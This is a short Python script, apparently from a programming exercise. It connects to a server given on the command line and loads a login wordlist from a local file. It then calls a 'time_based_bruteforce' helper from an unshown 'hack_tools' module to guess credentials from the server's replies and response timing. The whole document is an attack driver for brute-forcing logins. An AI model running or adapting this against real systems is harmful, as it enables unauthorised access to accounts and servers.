import socket, sys, hack_tools

with socket.socket() as my_socket:

    # connection
    hostname, port = sys.argv[1], int(sys.argv[2])
    address = (hostname, port)
    my_socket.connect(address)

    #encoding possible responces
    server_answers = hack_tools.encode_response("Connection success!", "Wrong login!", "Wrong password!", "Exception happened during login")

    #getting possible passwords from file
    logins_source = open("D:\Downloads\logins.txt")
    logins_list = list(logins_source.read().split())
    logins_source.close()

    verification_data = hack_tools.time_based_bruteforce(logins_list, server_answers, my_socket)
    print(verification_data)


